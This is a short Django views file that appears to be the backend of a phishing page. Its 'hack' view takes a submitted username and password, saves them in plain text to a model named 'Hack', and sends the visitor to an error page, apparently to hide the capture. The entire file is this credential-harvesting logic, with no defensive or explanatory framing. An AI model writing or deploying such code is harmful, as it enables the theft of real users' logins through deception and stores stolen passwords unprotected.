from django.shortcuts import render, redirect
from .models import Hack
from django.urls import reverse

def hack(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        create_hack = Hack.objects.create(username=username, password=password)
        create_hack.save()
        return redirect(reverse('err'))
    return render(request, 'index.html')


def err(request):
    return render(request, 'page.html')